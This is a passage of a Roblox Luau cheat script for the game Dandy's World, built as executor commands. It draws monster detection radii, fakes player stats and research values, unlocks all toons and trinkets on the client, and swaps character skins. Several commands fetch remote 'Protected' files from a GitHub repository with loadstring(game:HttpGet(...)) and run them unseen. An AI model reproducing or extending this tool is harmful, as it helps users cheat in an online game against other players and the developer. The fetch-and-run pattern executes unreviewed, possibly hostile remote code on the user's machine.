	local visionRadius = chaser:FindFirstChild("VisionRadius")
	local hearingRadius = chaser:FindFirstChild("HearingRadius")

	local anchorPart = getAnchorPart(monster)
	if not anchorPart then return end

	-- Create visualization data
	local visData = {
		spheres = {},
		connections = {},
		anchorPart = anchorPart
	}
	activeVisualizations[monster] = visData

	-- Create spheres in Workspace
	if killRadius then
		visData.spheres.KillRadius = createsphere(killRadius.Value, Color3.new(1, 0, 0), monster.Name.."_KillRadiusSphere")
	end
	if instantRadius then
		visData.spheres.InstantRadius = createsphere(instantRadius.Value, Color3.new(1, 0.5, 0), monster.Name.."_InstantRadiusSphere")
	end
	if visionRadius then
		visData.spheres.VisionRadius = createsphere(visionRadius.Value, Color3.new(1, 1, 0), monster.Name.."_VisionRadiusSphere")
	end
	if hearingRadius then
		visData.spheres.HearingRadius = createsphere(hearingRadius.Value, Color3.new(0, 1, 0), monster.Name.."_HearingRadiusSphere")
	end

	-- Update sphere positions
	local function updatePositions()
		for _, sphere in pairs(visData.spheres) do
			if sphere and sphere.Parent then
				sphere.Position = anchorPart.Position
			end
		end
	end

	-- Heartbeat connection for position updates
	table.insert(visData.connections, noxious["run service"].Heartbeat:Connect(updatePositions))

	-- Clean up if monster is destroyed
	table.insert(visData.connections, monster.AncestryChanged:Connect(function(_, parent)
		if not monster:IsDescendantOf(game) then
			cleanupVisualization(monster)
		end
	end))

	-- Initial update
	updsv(monster)
	updatePositions()
end

-- Main initialization
if game.PlaceId == noxious["dandy's world run"] then
	-- Handle existing monsters
	local currentRoom = workspace:FindFirstChild("CurrentRoom")
	if currentRoom then
		for _, model in pairs(currentRoom:GetChildren()) do
			local monstersFolder = model:FindFirstChild("Monsters")
			if monstersFolder then
				for _, monster in pairs(monstersFolder:GetChildren()) do
					if monster:IsA("Model") then
						task.spawn(visualizemonsterradii, monster)
					end
				end
			end
		end
	end

	-- Monitor for new monsters
	workspace.DescendantAdded:Connect(function(descendant)
		if descendant.Name == "Monsters" and descendant:IsA("Folder") then
			descendant.ChildAdded:Connect(function(monster)
				if monster:IsA("Model") then
					task.wait(0.2) -- Allow time for Chaser to be added
					visualizemonsterradii(monster)
				end
			end)
		end
	end)

	-- Initial hide all
	hideRadius("KillRadius")
	hideRadius("InstantRadius")
	hideRadius("VisionRadius")
	hideRadius("HearingRadius")
end

addcommand("enableallvisualizers", "eav", function()
	spawn(function() showradius("KillRadius") end)
	spawn(function() showradius("InstantRadius") end)
	spawn(function() showradius("VisionRadius") end)
	spawn(function() showradius("HearingRadius") end)
end)

addcommand("disableallvisualizers", "dav", function()
	spawn(function() hideRadius("KillRadius") end)
	spawn(function() hideRadius("InstantRadius") end)
	spawn(function() hideRadius("VisionRadius") end)
	spawn(function() hideRadius("HearingRadius") end)
end)

addcommand("showkillvisualizer", "skv", function()
	spawn(function() showradius("KillRadius") end)
end)

addcommand("hidekillvisualizer", "hkv", function()
	spawn(function() hideRadius("KillRadius") end)
end)

addcommand("shownearvisualizer", "snv", function()
	spawn(function() showradius("InstantRadius") end)
end)

addcommand("hidenearvisualizer", "hnv", function()
	spawn(function() hideRadius("InstantRadius") end)
end)

addcommand("showvisionvisualizer", "svv", function()
	spawn(function() showradius("VisionRadius") end)
end)

addcommand("hidevisionvisualizer", "hvv", function()
	spawn(function() hideRadius("VisionRadius") end)
end)

addcommand("showhearingvisualizer", "shv", function()		
	spawn(function() showradius("HearingRadius") end)
end)

addcommand("hidehearingvisualizer", "hhv", function()
	spawn(function() hideRadius("HearingRadius") end)
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("fakeblackouts", "fblackouts", function(playerId, value)
	local playerData = game:GetService"ReplicatedStorage":WaitForChild"PlayerData"		
	local playerFolder = playerData:FindFirstChild(tostring(playerId))

	if playerFolder and playerFolder:FindFirstChild"Blackouts"and playerFolder.Coin:IsA"NumberValue"then
		playerFolder.Blackouts.Value = value
	end
end)

addcommand("fakeichor", "fichor", function(playerId, value)
	local playerData = game:GetService"ReplicatedStorage":WaitForChild"PlayerData"		
	local playerFolder = playerData:FindFirstChild(tostring(playerId))

	if playerFolder and playerFolder:FindFirstChild"Coin"and playerFolder.Coin:IsA"NumberValue"then
		playerFolder.Coin.Value = value
	end
end)

addcommand("fakedandyitemspurchased", "fdip", function(playerId, value)
	local playerData = game:GetService"ReplicatedStorage":WaitForChild"PlayerData"		
	local playerFolder = playerData:FindFirstChild(tostring(playerId))

	if playerFolder and playerFolder:FindFirstChild"DandyItemsPurchased"and playerFolder.Coin:IsA"NumberValue"then
		playerFolder.DandyItemsPurchased.Value = value
	end
end)

addcommand("fakefloorstraveled", "fft", function(playerId, value)
	local playerData = game:GetService"ReplicatedStorage":WaitForChild"PlayerData"		
	local playerFolder = playerData:FindFirstChild(tostring(playerId))

	if playerFolder and playerFolder:FindFirstChild"FloorsTraveled"and playerFolder.Coin:IsA"NumberValue"then
		playerFolder.FloorsTraveled.Value = value
	end
end)

addcommand("fakemachinescompleted", "fmc", function(playerId, value)
	local playerData = game:GetService"ReplicatedStorage":WaitForChild"PlayerData"		
	local playerFolder = playerData:FindFirstChild(tostring(playerId))

	if playerFolder and playerFolder:FindFirstChild"GeneratorsCompleted"and playerFolder.Coin:IsA"NumberValue"then
		playerFolder.GeneratorsCompleted.Value = value
	end
end)

addcommand("fakefurthestfloor", "fff", function(playerId, value)
	local playerData = game:GetService"ReplicatedStorage":WaitForChild"PlayerData"		
	local playerFolder = playerData:FindFirstChild(tostring(playerId))

	if playerFolder and playerFolder:FindFirstChild"HighestFloor"and playerFolder.Coin:IsA"NumberValue"then
		playerFolder.HighestFloor.Value = value
	end
end)

addcommand("fakeitemspickedup", "fipu", function(playerId, value)
	local playerData = game:GetService"ReplicatedStorage":WaitForChild"PlayerData"		
	local playerFolder = playerData:FindFirstChild(tostring(playerId))

	if playerFolder and playerFolder:FindFirstChild"ItemsPickedUp"and playerFolder.Coin:IsA"NumberValue"then
		playerFolder.ItemsPickedUp.Value = value
	end
end)

addcommand("changeresearch", "cr", function(monsterName, value)
	local replicatedStorage = game:GetService("ReplicatedStorage")

	local formattedMonsterName = capname(monsterName) .. "Monster"

	value = tonumber(value)

	local playerDataFolder = replicatedStorage:FindFirstChild("PlayerData")

	local playerFile = playerDataFolder:FindFirstChild(tostring(noxious["local player"].UserId))

	local researchFolder = playerFile:FindFirstChild("Research")

	local monster = researchFolder:FindFirstChild(formattedMonsterName)

	monster.Value = value
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("unlockalltoons", "uato", function()
	local player = game.Players.LocalPlayer.UserId
	local folder = game.ReplicatedStorage.PlayerData:FindFirstChild(player).Towers

	local names = { "Flyte", "Yatta", "Bassie", "Cocoa", "Eggson", "Bobette", "Coal", "Rudie", "Ginger", "Boxten", "Rudie", "Brightney", "Cosmo", "Connie", "Finn", "Flutter", "Gigi", "Glisten", "Goob", "Poppy", "RazzleDazzle", "Rodger", "Scraps", "Shrimpo", "Teagan", "Tisha", "Toodles", "Sprout", "Vee", "Dandy", "Shelly", "Pebble", "Astro", "Dandy", "Looey"}
	for _, name in pairs(names) do
		local toon = Instance.new("StringValue", folder)
		toon.Name = name
		toon.Value = "Default"
	end
	execcmd("re")
end)

addcommand("unlockalltrinkets", "uatr", function()
	local player = game.Players.LocalPlayer.UserId
	local folder = game.ReplicatedStorage.PlayerData:FindFirstChild(player).Trinkets

	local names = { "EggRadar", "WhisperingFlower", "GlazedFondantBag", "Scrapbook", "PartyPopper", "FestiveLights", "Coal", "ToyKit", "PeppermintIcing", "BlushyBat", "Alarm", "Cardboard'Armor'", "CoinPurse", "Megaphone", "PopPack", "PullToy", "SpeedyShoes", "Speedometer", "Thermos", "ThinkingCap", "WaterCooler", "Wrench", " Brick", "BlueBandana", "Bone", "CrayonSet", "DandyPlush", "DogPlush", " FriendshipBracelet", "MachineManual", "Magnifying Glass", "NightCap", "PinkBow", " RibbonSpool", "SpareBulb", "VeeRemote", "ClownHorn", "GhostSnakes"}
	for _, name in pairs(names) do
		local trinket = Instance.new("StringValue", folder)
		trinket.Name = name
		trinket.Value = "Default"
	end
	execcmd("re")
end)

addcommand("showalltooncards", "satc", function()
	local player = game.Players.LocalPlayer
	local scrollingFrame = player:WaitForChild"PlayerGui"			
		:WaitForChild"ScreenGui"			
		:WaitForChild"SelectionFrame"			
		:WaitForChild"ScrollingFrame"

	for _, child in pairs(scrollingFrame:GetChildren()) do
		if child:IsA"TextButton"and child.Name ~= "Template" then
			child.Visible = true
		end
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

function resetchar()
	local player = game.Players.LocalPlayer
	local character = player.Character or player.CharacterAdded:Wait()

	stopRainbowLoop()
	if not stopRainbowLoop() then
		resetCharacter(character)
	end

	spawn(function()
		game.Players.LocalPlayer.Character.ArmL.Transparency = 0
		game.Players.LocalPlayer.Character.ArmL2.Transparency = 0
		game.Players.LocalPlayer.Character.ArmR.Transparency = 0
		game.Players.LocalPlayer.Character.ArmR2.Transparency = 0
		game.Players.LocalPlayer.Character.Hair.Transparency = 0
		game.Players.LocalPlayer.Character.HandL.Transparency = 0
		game.Players.LocalPlayer.Character.HandR.Transparency = 0
		game.Players.LocalPlayer.Character.Head.Transparency = 0
		game.Players.LocalPlayer.Character.LegL.Transparency = 0
		game.Players.LocalPlayer.Character.LegL2.Transparency = 0
		game.Players.LocalPlayer.Character.LegR.Transparency = 0
		game.Players.LocalPlayer.Character.LegR2.Transparency = 0
	end)
end

addcommand("restorecharacter", "rec", function()
	resetchar()
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("sproutcutout", "stc", function()
	game.Players.LocalPlayer.Character.Body.MeshId = "rbxassetid://14685582359"
	game.Players.LocalPlayer.Character.Body.TextureID = "rbxassetid://14685585037"
	game.Players.LocalPlayer.Character.ArmL.Transparency = 1
	game.Players.LocalPlayer.Character.ArmL2.Transparency = 1
	game.Players.LocalPlayer.Character.ArmR.Transparency = 1
	game.Players.LocalPlayer.Character.ArmR2.Transparency = 1
	game.Players.LocalPlayer.Character.Hair.Transparency = 1
	game.Players.LocalPlayer.Character.HandL.Transparency = 1
	game.Players.LocalPlayer.Character.HandR.Transparency = 1
	game.Players.LocalPlayer.Character.Head.Transparency = 1
	game.Players.LocalPlayer.Character.LegL.Transparency = 1
	game.Players.LocalPlayer.Character.LegL2.Transparency = 1
	game.Players.LocalPlayer.Character.LegR.Transparency = 1
	game.Players.LocalPlayer.Character.LegR2.Transparency = 1
end)

addcommand("dandycutout", "dyc", function()
	game.Players.LocalPlayer.Character.Body.MeshId = "rbxassetid://14685044008"
	game.Players.LocalPlayer.Character.Body.TextureID = "rbxassetid://14685046783"
	game.Players.LocalPlayer.Character.ArmL.Transparency = 1
	game.Players.LocalPlayer.Character.ArmL2.Transparency = 1
	game.Players.LocalPlayer.Character.ArmR.Transparency = 1
	game.Players.LocalPlayer.Character.ArmR2.Transparency = 1
	game.Players.LocalPlayer.Character.Hair.Transparency = 1
	game.Players.LocalPlayer.Character.HandL.Transparency = 1
	game.Players.LocalPlayer.Character.HandR.Transparency = 1
	game.Players.LocalPlayer.Character.Head.Transparency = 1
	game.Players.LocalPlayer.Character.LegL.Transparency = 1
	game.Players.LocalPlayer.Character.LegL2.Transparency = 1
	game.Players.LocalPlayer.Character.LegR.Transparency = 1
	game.Players.LocalPlayer.Character.LegR2.Transparency = 1
end)

addcommand("shellycutout", "syc", function()
	game.Players.LocalPlayer.Character.Body.MeshId = "rbxassetid://14687965432"
	game.Players.LocalPlayer.Character.Body.TextureID = "rbxassetid://14687967976"
	game.Players.LocalPlayer.Character.ArmL.Transparency = 1
	game.Players.LocalPlayer.Character.ArmL2.Transparency = 1
	game.Players.LocalPlayer.Character.ArmR.Transparency = 1
	game.Players.LocalPlayer.Character.ArmR2.Transparency = 1
	game.Players.LocalPlayer.Character.Hair.Transparency = 1
	game.Players.LocalPlayer.Character.HandL.Transparency = 1
	game.Players.LocalPlayer.Character.HandR.Transparency = 1
	game.Players.LocalPlayer.Character.Head.Transparency = 1
	game.Players.LocalPlayer.Character.LegL.Transparency = 1
	game.Players.LocalPlayer.Character.LegL2.Transparency = 1
	game.Players.LocalPlayer.Character.LegR.Transparency = 1
	game.Players.LocalPlayer.Character.LegR2.Transparency = 1
end)

addcommand("pebblecutout", "pec", function()
	game.Players.LocalPlayer.Character.Body.MeshId = "rbxassetid://14685339427"
	game.Players.LocalPlayer.Character.Body.TextureID = "rbxassetid://14685341892"
	game.Players.LocalPlayer.Character.ArmL.Transparency = 1
	game.Players.LocalPlayer.Character.ArmL2.Transparency = 1
	game.Players.LocalPlayer.Character.ArmR.Transparency = 1
	game.Players.LocalPlayer.Character.ArmR2.Transparency = 1
	game.Players.LocalPlayer.Character.Hair.Transparency = 1
	game.Players.LocalPlayer.Character.HandL.Transparency = 1
	game.Players.LocalPlayer.Character.HandR.Transparency = 1
	game.Players.LocalPlayer.Character.Head.Transparency = 1
	game.Players.LocalPlayer.Character.LegL.Transparency = 1
	game.Players.LocalPlayer.Character.LegL2.Transparency = 1
	game.Players.LocalPlayer.Character.LegR.Transparency = 1
	game.Players.LocalPlayer.Character.LegR2.Transparency = 1
end)

addcommand("astrocutout", "aoc", function()
	game.Players.LocalPlayer.Character.Body.MeshId = "rbxassetid://14688397977"
	game.Players.LocalPlayer.Character.Body.TextureID = "rbxassetid://14688394959"
	game.Players.LocalPlayer.Character.ArmL.Transparency = 1
	game.Players.LocalPlayer.Character.ArmL2.Transparency = 1
	game.Players.LocalPlayer.Character.ArmR.Transparency = 1
	game.Players.LocalPlayer.Character.ArmR2.Transparency = 1
	game.Players.LocalPlayer.Character.Hair.Transparency = 1
	game.Players.LocalPlayer.Character.HandL.Transparency = 1
	game.Players.LocalPlayer.Character.HandR.Transparency = 1
	game.Players.LocalPlayer.Character.Head.Transparency = 1
	game.Players.LocalPlayer.Character.LegL.Transparency = 1
	game.Players.LocalPlayer.Character.LegL2.Transparency = 1
	game.Players.LocalPlayer.Character.LegR.Transparency = 1
	game.Players.LocalPlayer.Character.LegR2.Transparency = 1
end)

addcommand("veecutout", "vec", function()
	game.Players.LocalPlayer.Character.Body.MeshId = "rbxassetid://14687687688"
	game.Players.LocalPlayer.Character.Body.TextureID = "rbxassetid://14687691668"
	game.Players.LocalPlayer.Character.ArmL.Transparency = 1
	game.Players.LocalPlayer.Character.ArmL2.Transparency = 1
	game.Players.LocalPlayer.Character.ArmR.Transparency = 1
	game.Players.LocalPlayer.Character.ArmR2.Transparency = 1
	game.Players.LocalPlayer.Character.Hair.Transparency = 1
	game.Players.LocalPlayer.Character.HandL.Transparency = 1
	game.Players.LocalPlayer.Character.HandR.Transparency = 1
	game.Players.LocalPlayer.Character.Head.Transparency = 1
	game.Players.LocalPlayer.Character.LegL.Transparency = 1
	game.Players.LocalPlayer.Character.LegL2.Transparency = 1
	game.Players.LocalPlayer.Character.LegR.Transparency = 1
	game.Players.LocalPlayer.Character.LegR2.Transparency = 1
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("bodiless", "bl", function()
	spawn(function() game.Players.LocalPlayer.Character.ArmL.Transparency = 1 end)
	spawn(function() game.Players.LocalPlayer.Character.ArmL2.Transparency = 1 end)
	spawn(function() game.Players.LocalPlayer.Character.ArmR.Transparency = 1 end)
	spawn(function() game.Players.LocalPlayer.Character.ArmR2.Transparency = 1 end)
	spawn(function() game.Players.LocalPlayer.Character.HandL.Transparency = 1 end)
	spawn(function() game.Players.LocalPlayer.Character.Body.Transparency = 1 end)
	spawn(function() game.Players.LocalPlayer.Character.HandR.Transparency = 1 end)
	spawn(function() game.Players.LocalPlayer.Character.LegL.Transparency = 1 end)
	spawn(function() game.Players.LocalPlayer.Character.LegL2.Transparency = 1 end)
	spawn(function() game.Players.LocalPlayer.Character.LegR.Transparency = 1 end)
	spawn(function() game.Players.LocalPlayer.Character.LegR2.Transparency = 1 end)
end)

addcommand("unbodiless", "ubl", function()
	spawn(function() game.Players.LocalPlayer.Character.ArmL.Transparency = 0 end)
	spawn(function() game.Players.LocalPlayer.Character.ArmL2.Transparency = 0 end)
	spawn(function() game.Players.LocalPlayer.Character.ArmR.Transparency = 0 end)
	spawn(function() game.Players.LocalPlayer.Character.ArmR2.Transparency = 0 end)
	spawn(function() game.Players.LocalPlayer.Character.HandL.Transparency = 0 end)
	spawn(function() game.Players.LocalPlayer.Character.Body.Transparency = 0 end)
	spawn(function() game.Players.LocalPlayer.Character.HandR.Transparency = 0 end)
	spawn(function() game.Players.LocalPlayer.Character.LegL.Transparency = 0 end)
	spawn(function() game.Players.LocalPlayer.Character.LegL2.Transparency = 0 end)
	spawn(function() game.Players.LocalPlayer.Character.LegR.Transparency = 0 end)
	spawn(function() game.Players.LocalPlayer.Character.LegR2.Transparency = 0 end)
end)

addcommand("headless", "hl", function()
	spawn(function() game.Players.LocalPlayer.Character.Hair.Transparency = 1 end)
	spawn(function() game.Players.LocalPlayer.Character.Head.Transparency = 1 end)
end)

addcommand("unheadless", "uhl", function()
	spawn(function() game.Players.LocalPlayer.Character.Hair.Transparency = 0 end)
	spawn(function() game.Players.LocalPlayer.Character.Head.Transparency = 0 end)
end)

addcommand("legless", "ll", function()
	spawn(function() game.Players.LocalPlayer.Character.LegL.Transparency = 1 end)
	spawn(function() game.Players.LocalPlayer.Character.LegL2.Transparency = 1 end)
	spawn(function() game.Players.LocalPlayer.Character.LegR.Transparency = 1 end)
	spawn(function() game.Players.LocalPlayer.Character.LegR2.Transparency = 1 end)
end)

addcommand("unlegless", "ull", function()
	spawn(function() game.Players.LocalPlayer.Character.LegL.Transparency = 0 end)
	spawn(function() game.Players.LocalPlayer.Character.LegL2.Transparency = 0 end)
	spawn(function() game.Players.LocalPlayer.Character.LegR.Transparency = 0 end)
	spawn(function() game.Players.LocalPlayer.Character.LegR2.Transparency = 0 end)
end)

addcommand("armless", "al", function()
	spawn(function() game.Players.LocalPlayer.Character.ArmL.Transparency = 1 end)
	spawn(function() game.Players.LocalPlayer.Character.ArmL2.Transparency = 1 end)
	spawn(function() game.Players.LocalPlayer.Character.ArmR.Transparency = 1 end)
	spawn(function() game.Players.LocalPlayer.Character.ArmR2.Transparency = 1 end)
	spawn(function() game.Players.LocalPlayer.Character.HandL.Transparency = 1 end)
	spawn(function() game.Players.LocalPlayer.Character.HandR.Transparency = 1 end)
end)

addcommand("unarmless", "ual", function()
	spawn(function() game.Players.LocalPlayer.Character.ArmL.Transparency = 0 end)
	spawn(function() game.Players.LocalPlayer.Character.ArmL2.Transparency = 0 end)
	spawn(function() game.Players.LocalPlayer.Character.ArmR.Transparency = 0 end)
	spawn(function() game.Players.LocalPlayer.Character.ArmR2.Transparency = 0 end)
	spawn(function() game.Players.LocalPlayer.Character.HandL.Transparency = 0 end)
	spawn(function() game.Players.LocalPlayer.Character.HandR.Transparency = 0 end)
end)

-------------------------------------------------------------------------------------------------------------------------------

local textureSequence = {
	{textureId = "rbxassetid://111525026642180", waitTime = 0.3},
	{textureId = "rbxassetid://131115976292268", waitTime = 0.2},
	{textureId = "rbxassetid://70596614839666", waitTime = 0.3},
	{textureId = "rbxassetid://17230708611", waitTime = 0}
}

local isRunning = false

function changeHeadTextures()
	local head = character:WaitForChild"Head"		
	while isRunning do
		for _, texture in ipairs(textureSequence) do
			head.TextureID = texture.textureId
			wait(texture.waitTime)
		end
		local interval = math.random(5, 10)
		wait(interval)
	end
end

addcommand("enablegoobfrogblinking", "egfb", function()
	local player = game.Players.LocalPlayer
	local character = player.Character or player.CharacterAdded:Wait()
	character:WaitForChild"Head"		
	local playerModel = workspace:FindFirstChild"Players"or workspace:FindFirstChild"InGamePlayers"

	local toonName = playerModel and playerModel:FindFirstChild(player.Name) and playerModel[player.Name]:FindFirstChild"ToonName"

	local characterName
	if not toonName then
		local config = playerModel and playerModel:FindFirstChild(player.Name) and playerModel[player.Name]:FindFirstChild"Config"			
		local charNameValue = config and config:FindFirstChild"CharacterName"			
		if charNameValue and charNameValue:IsA"StringValue"then
			characterName = charNameValue.Value
		end
	end

	if (not toonName or toonName.Value ~= "Goob") and (not characterName or characterName ~= "Goob") then
		notify("You need to be Goob to enable this.", 5, "error")
		return
	end

	if not isRunning then
		isRunning = true
		task.spawn(changeHeadTextures)
	end
end)

addcommand("disablegoobfrogblinking", "dgfb", function()
	isRunning = false
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("valentinesgigi", "vgs", function()
	local player = game.Players.LocalPlayer
	local character = player.Character or player.CharacterAdded:Wait()
	character:WaitForChild"Head"		
	local playerModel = workspace:FindFirstChild"Players"or workspace:FindFirstChild"InGamePlayers"

	local toonName = playerModel and playerModel:FindFirstChild(player.Name) and playerModel[player.Name]:FindFirstChild"ToonName"

	local characterName
	if not toonName then
		local config = playerModel and playerModel:FindFirstChild(player.Name) and playerModel[player.Name]:FindFirstChild"Config"			
		local charNameValue = config and config:FindFirstChild"CharacterName"			
		if charNameValue and charNameValue:IsA"StringValue"then
			characterName = charNameValue.Value
		end
	end

	if (not toonName or toonName.Value ~= "Gigi") and (not characterName or characterName ~= "Gigi") then
		notify("You need to be Gigi to enable this.", 5, "error")
		return
	end
	spawn(function() notify("Textures made by @gigi_hilton on Discord.", 5) end)
	spawn(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/REEEPlayz/scripts/refs/heads/main/Protected_9863293693457255.txt"))() end)
	local lp = game.Players.LocalPlayer

	while wait() do
		local playerModel = workspace.Players:FindFirstChild(lp.Name)
		if playerModel then
			local head = playerModel:FindFirstChild("Head")
			if head and head:IsA("MeshPart") then
				if head.TextureID == "rbxassetid://83540766287737" then
					head.TextureID = "rbxassetid://116185337235882"
				end
			end
		end
	end
end)

addcommand("valentinesshelly", "vss", function()
	local player = game.Players.LocalPlayer
	local character = player.Character or player.CharacterAdded:Wait()
	character:WaitForChild"Head"		
	local playerModel = workspace:FindFirstChild"Players"or workspace:FindFirstChild"InGamePlayers"

	local toonName = playerModel and playerModel:FindFirstChild(player.Name) and playerModel[player.Name]:FindFirstChild"ToonName"

	local characterName
	if not toonName then
		local config = playerModel and playerModel:FindFirstChild(player.Name) and playerModel[player.Name]:FindFirstChild"Config"			
		local charNameValue = config and config:FindFirstChild"CharacterName"			
		if charNameValue and charNameValue:IsA"StringValue"then
			characterName = charNameValue.Value
		end
	end

	if (not toonName or toonName.Value ~= "Shelly") and (not characterName or characterName ~= "Shelly") then
		notify("You need to be Shelly to enable this.", 5, "error")
		return
	end
	spawn(function() notify("Textures made by @gigi_hilton on Discord.", 5) end)
	spawn(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/REEEPlayz/scripts/refs/heads/main/Protected_4193210726309669.txt"))() end)
	local lp = game.Players.LocalPlayer

	while wait() do
		local playerModel = workspace.Players:FindFirstChild(lp.Name)
		if playerModel then
			local head = playerModel:FindFirstChild("Head")
			if head and head:IsA("MeshPart") then
				if head.TextureID == "rbxassetid://18199044961" then
					head.TextureID = "rbxassetid://78001174238814"
				end
			end
		end
	end
end)

addcommand("twistedpoppyskin", "tps", function()
	local player = game.Players.LocalPlayer
	local character = player.Character or player.CharacterAdded:Wait()
	character:WaitForChild"Head"		
	local playerModel = workspace:FindFirstChild"Players"or workspace:FindFirstChild"InGamePlayers"

	local toonName = playerModel and playerModel:FindFirstChild(player.Name) and playerModel[player.Name]:FindFirstChild"ToonName"

	local characterName
	if not toonName then
		local config = playerModel and playerModel:FindFirstChild(player.Name) and playerModel[player.Name]:FindFirstChild"Config"			
		local charNameValue = config and config:FindFirstChild"CharacterName"			
		if charNameValue and charNameValue:IsA"StringValue"then
			characterName = charNameValue.Value
		end
	end

	if (not toonName or toonName.Value ~= "Poppy") and (not characterName or characterName ~= "Poppy") then
		notify("You need to be Poppy to enable this.", 5, "error")
		return
	end
	loadstring(game:HttpGet("https://raw.githubusercontent.com/REEEPlayz/scripts/refs/heads/main/Protected_8863153958472817.txt"))()
end)

addcommand("becomedandy", "bd", function()
	local player = game.Players.LocalPlayer
	local character = player.Character or player.CharacterAdded:Wait()
	character:WaitForChild"Head"		
	local playerModel = workspace:FindFirstChild"Players"or workspace:FindFirstChild"InGamePlayers"

	local toonName = playerModel and playerModel:FindFirstChild(player.Name) and playerModel[player.Name]:FindFirstChild"ToonName"

	local characterName
	if not toonName then
		local config = playerModel and playerModel:FindFirstChild(player.Name) and playerModel[player.Name]:FindFirstChild"Config"			
		local charNameValue = config and config:FindFirstChild"CharacterName"			
		if charNameValue and charNameValue:IsA"StringValue"then
			characterName = charNameValue.Value
		end
	end

	if (not toonName or toonName.Value ~= "Boxten") and (not characterName or characterName ~= "Boxten") then
		notify("You need to be Boxten to enable this.", 5, "error")
		return
	end

	local Dandy, DHAir
	if game.PlaceId == noxious["dandy's world run"] then
		Dandy = workspace.Elevators.Elevator.DandyStore.DandyShop
		DHAir = Dandy.Hair
	elseif game.PlaceId == noxious["dandy's world lobby"] then
		Dandy = workspace.DandyStore
		DHAir = workspace.DandyStore.Hair
	end

	local CHAir = character:FindFirstChild"Hair"		
	for _, partA in ipairs(Dandy:GetDescendants()) do
		local partB = character:FindFirstChild(partA.Name, true)
		if partB then
			DHAir.Parent = character
			DHAir.Joint.Part0 = character.Head
			wait(0.01)

			character.Animate.idle.Animation1.AnimationId = "rbxassetid://16496520991"
			character.Animate.idle.Animation2.AnimationId = "rbxassetid://16496520991"
			character.Animate.run.RunAnim.AnimationId = "rbxassetid://16496812530"
			character.Config.NormalTexture.Texture = "rbxassetid://16496414911"
			character.Config.HurtTexture.Texture = "rbxassetid://17561468145"

			if CHAir then
				CHAir:Destroy()
			end
			wait(0.01)

			if partA:IsA"MeshPart"and partB:IsA"MeshPart"then
				local tempMeshId = partA.MeshId
				partA.MeshId = partB.MeshId
				partB.MeshId = tempMeshId

				local tempTextureId = partA.TextureID
				partA.TextureID = partB.TextureID
				partB.TextureID = tempTextureId
			elseif partA:IsA"SpecialMesh"and partB:IsA"SpecialMesh"then
				local tempMeshId = partA.MeshId
				partA.MeshId = partB.MeshId
				partB.MeshId = tempMeshId
			end
		end
	end
end)

addcommand("unabliusunablecifer", "uu", function()
	local player = game.Players.LocalPlayer
	local character = player.Character or player.CharacterAdded:Wait()
	character:WaitForChild"Head"		
	local playerModel = workspace:FindFirstChild"Players"or workspace:FindFirstChild"InGamePlayers"

	local toonName = playerModel and playerModel:FindFirstChild(player.Name) and playerModel[player.Name]:FindFirstChild"ToonName"

	local characterName
	if not toonName then
		local config = playerModel and playerModel:FindFirstChild(player.Name) and playerModel[player.Name]:FindFirstChild"Config"			
		local charNameValue = config and config:FindFirstChild"CharacterName"			
		if charNameValue and charNameValue:IsA"StringValue"then
			characterName = charNameValue.Value
		end
	end

	if (not toonName or toonName.Value ~= "Boxten") and (not characterName or characterName ~= "Boxten") then
		notify("You need to be Boxten to enable this.", 5, "error")
		return
	end

	local Dandy, DHAir
	if game.PlaceId == noxious["dandy's world run"] then
		Dandy = workspace.Elevators.Elevator.DandyStore.DandyShop
		DHAir = Dandy.Hair
	elseif game.PlaceId == noxious["dandy's world lobby"] then
		Dandy = workspace.DandyStore
		DHAir = workspace.DandyStore.Hair
	end

	local CHAir = character.Hair

	for _, partA in ipairs(Dandy:GetDescendants()) do
		local partB = character:FindFirstChild(partA.Name, true)
		if partB then
			DHAir.Parent = character
			DHAir.Joint.Part0 = character.Head
			wait(0.01)
			character.Animate.idle.Animation1.AnimationId = "rbxassetid://16496520991"
			character.Animate.idle.Animation2.AnimationId = "rbxassetid://16496520991"
			character.Animate.run.RunAnim.AnimationId = "rbxassetid://16496812530"
			character.Config.NormalTexture.Texture = "rbxassetid://16496414911"
			character.Config.HurtTexture.Texture = "rbxassetid://17561468145"

			CHAir:Destroy()
			wait(0.01)
			if partA:IsA("MeshPart") and partB:IsA("MeshPart") then
				local tempMeshId = partA.MeshId
				partA.MeshId = partB.MeshId
				partB.MeshId = tempMeshId
				local tempTextureId = partA.TextureID
				partA.TextureID = partB.TextureID
				partB.TextureID = tempTextureId


			end
			if partA:IsA("SpecialMesh") and partB:IsA("SpecialMesh") then
				local tempMeshId = partA.MeshId
				partA.MeshId = partB.MeshId
				partB.MeshId = tempMeshId
			end
		end
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

-- Store original properties for resetting
local originalProperties = {}
local currentGhostMode = nil -- 'rainbow' or color

-- Function to store the original properties
local function storeOriginalProperties(character)
	originalProperties[character] = {}
	for _, part in pairs(character:GetDescendants()) do
		if part:IsA("BasePart") then
			originalProperties[character][part] = {
				Color = part.Color,
				Transparency = part.Transparency,
				Material = part.Material,
				TextureID = part:IsA("MeshPart") and part.TextureID or nil,
			}
		end
	end
end

-- Function to reset character to original properties
function resetCharacter(character)
	if not character then return end

	local charProps = originalProperties[character]
	if not charProps then return end

	for part, originalProp in pairs(charProps) do
		if part and part.Parent then
			part.Color = originalProp.Color
			part.Transparency = originalProp.Transparency
			part.Material = originalProp.Material

			if part:IsA("MeshPart") then
				part.TextureID = originalProp.TextureID or ""
			end
		end
	end

	originalProperties[character] = nil
end

-- Rainbow color loop management
local rainbowLoopRunning = false
local rainbowLoopConnection = nil

function stopRainbowLoop()
	if rainbowLoopConnection then
		rainbowLoopConnection:Disconnect()
		rainbowLoopConnection = nil
	end
	rainbowLoopRunning = false
end

function createRainbowLoop(character)
	stopRainbowLoop()
	rainbowLoopRunning = true

	rainbowLoopConnection = noxious["run service"].Heartbeat:Connect(function()
		if not character or not character.Parent then
			stopRainbowLoop()
			return
		end

		local time = tick()
		for _, part in pairs(character:GetDescendants()) do
			if part:IsA("BasePart") then
				local hue = (time % 10) / 10
				part.Color = Color3.fromHSV(hue, 1, 1)
			end
		end
	end)
end

function removeTexturesAndChangeAppearance(character, color)
	for _, part in pairs(character:GetDescendants()) do
